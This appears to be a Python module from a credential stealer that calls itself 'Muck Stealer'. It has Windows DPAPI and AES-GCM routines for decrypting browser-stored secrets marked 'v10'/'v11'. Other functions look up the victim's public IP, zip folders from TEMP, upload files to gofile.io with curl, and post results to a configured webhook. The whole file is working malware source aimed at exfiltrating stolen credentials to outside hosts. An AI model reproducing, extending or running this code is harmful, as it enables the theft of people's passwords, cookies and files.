import os
import re
import json
import base64
import sqlite3
import shutil
import subprocess
import random
import string
import urllib.request
import zipfile
import io
import gzip
from datetime import datetime
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from core.config import WEBHOOK_URL

temp = os.getenv("TEMP")

class DATA_BLOB(Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]

def getip():
    try:
        return urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
    except:
        return "None"

def zipfolder(foldername, target_dir):
    zipobj = zipfile.ZipFile(temp + "/" + foldername + '.zip', 'w', zipfile.ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if "user_data" not in fn:
                zipobj.write(fn, fn[rootlen:])

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts in ('v10', 'v11'):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16]
        try:
            decrypted_pass = decrypted_pass.decode()
        except:
            pass
        return decrypted_pass

def LoadUrlib(hook, data='', headers=''):
    for i in range(8):
        try:
            if headers:
                r = urllib.request.urlopen(urllib.request.Request(hook, data=data, headers=headers))
            else:
                r = urllib.request.urlopen(urllib.request.Request(hook, data=data))
            return r
        except:
            pass

def uploadToAnonfiles(path):
    try:
        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://store4.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        return json.loads(r[0].decode('utf-8'))["data"]["downloadPage"]
    except:
        return False

def send_webhook(content):
    try:
        if WEBHOOK_URL and "webhooks" in WEBHOOK_URL:
            data = {"content": content, "username": "Muck Stealer"}
            req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(data).encode('utf-8'), headers={"Content-Type": "application/json"}, method='POST')
            urllib.request.urlopen(req)
    except:
        pass